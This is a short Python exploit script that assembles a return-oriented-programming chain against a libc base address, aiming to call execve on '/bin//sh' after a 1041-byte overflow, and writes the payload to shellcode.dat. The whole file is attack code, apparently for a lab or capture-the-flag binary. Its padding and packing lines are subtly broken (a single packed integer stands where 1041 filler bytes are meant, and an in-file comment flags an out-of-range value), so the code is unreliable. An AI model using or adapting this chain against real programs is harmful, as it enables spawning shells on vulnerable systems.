#!/usr/bin/python

import struct

import binascii
LIBC_OFFSET = 0x7ffff7a3a000
g1 = LIBC_OFFSET + 0xe76fa # pop rax ; ret
d1 = 59
g2 = LIBC_OFFSET + 0x1f940 + 0x1ab776 + 0x1d
d2 = 0
d3 = 0
g3 = LIBC_OFFSET + 0x1f940 + 0xb8993 + 0xe
d4 = 0x68732f2f6e69622f #integer out of range for 'q' format code
d5 = 0
g4 = LIBC_OFFSET + 0x1f940 + 0x18f503 + 0xf
g5 = LIBC_OFFSET + 0x1f940 + 0x132bae + 0xe


#shellcode = 'A'*(1041)

shellcode = struct.pack('<q',(0x90) * (1041))
shellcode += struct.pack('<q', g1)
shellcode += struct.pack('<q', d1)
shellcode += struct.pack('<q', g2)
shellcode += struct.pack('<q', d2)
shellcode += struct.pack('<q', d3)
shellcode += struct.pack('<q', g3)
shellcode += struct.pack('<q', d4)
shellcode += struct.pack('<q', d5)
shellcode += struct.pack('<q', g4)
shellcode += struct.pack('<q', g5)

print ("shellcode: "+ shellcode)
with open("shellcode.dat", "wb") as f:
    f.write(shellcode)
print (binascii.hexlify(shellcode))
print ("g1: %x" % (g1))